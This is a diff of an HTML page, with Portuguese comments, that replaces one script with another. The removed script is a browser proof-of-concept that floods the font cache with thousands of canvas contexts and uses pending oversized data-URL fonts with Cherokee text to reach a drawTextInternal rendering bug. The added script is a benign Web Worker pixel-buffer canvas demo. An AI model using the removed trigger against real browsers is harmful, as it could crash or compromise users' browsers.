@@ -1,57 +1,37 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <meta charset="utf-8">
-    <title>PoC Corrigida - Bypass de Cache para drawTextInternal</title>
+    <meta charset="UTF-8">
+    <title>Fallback OffscreenCanvas - Abordagem 1 (Pixel Buffer)</title>
+    <style>
+        body { background: #111; color: #fff; text-align: center; font-family: sans-serif; margin-top: 40px; }
+        canvas { border: 2px solid #444; background: #000; }
+    </style>
 </head>
 <body>
-<script>
-// 1. Satura o FontCascadeCache (3500 contextos de canvas) para forçar o prune inline
-const dummies = [];
-for (let i = 0; i < 3500; i++) {
-    const dummy = document.createElement('canvas').getContext('2d');
-    dummy.font = '10px "dummy' + i + '"';
-    dummies.push(dummy);
-}
+    <h1>Abordagem 1: Pixel Buffer via ArrayBuffer</h1>
+    <canvas id="meuCanvas" width="640" height="360"></canvas>
 
-// 2. Fonte de >= 1MB data: URL para manter o estado pendente
-const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
-
-const keepAlive = [];
-for (let attempt = 0; attempt < 2; attempt++) {
-    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
-    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
-    
-    document.fonts.add(metricsDonor);
-    document.fonts.add(measured);
-
-    const canvas = document.createElement('canvas');
-    canvas.width = 64;
-    canvas.height = 64;
-    canvas.style.position = 'absolute';
-    canvas.style.left = '-9999px';
-    document.body.appendChild(canvas);
-    
-    const context = canvas.getContext('2d');
-    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
-    keepAlive.push(metricsDonor, measured, context);
-
-    try {
-        // Passo A: Usamos strings ligeiramente diferentes ou invalidamos a propriedade de estilo 
-        // entre as chamadas para garantir que o cache de shaped text NÃO seja reutilizado cegamente,
-        // forçando o drawTextInternal a entrar no fluxo completo de largura e métricas.
+    <script>
+        const canvas = document.getElementById('meuCanvas');
+        const ctx = canvas.getContext('2d');
         
-        // Altera sutilmente o estado do canvas para invalidar o cache de desenho otimizado
-        context.fillStyle = 'black';
-        
-        // Chamada direta do fillText com os caracteres Cherokee, 
-        // mas forçando um estado de fonte não cacheado na primeira passagem de desenho
-        context.fillText('\u13A0\u13A2\u13A4', 10, 30);
+        // Inicializa o Web Worker
+        const worker = new Worker('worker1.js');
 
-    } catch (e) {
-        console.error(e);
-    }
-}
-</script>
+        // Recebe os dados de pixels processados no worker
+        worker.onmessage = function(e) {
+            const { buffer, width, height } = e.data;
+            const data = new Uint8ClampedArray(buffer);
+            
+            // Desenha os pixels diretamente no canvas da thread principal
+            const imageData = new ImageData(data, width, height);
+            ctx.putImageData(imageData, 0, 0);
+
+            // Devolve o buffer vazio/utilizado de volta ao worker (Pooling / Reutilização)
+            worker.postMessage({ buffer }, [buffer]);
+        };
+    </script>
 </body>
 </html>
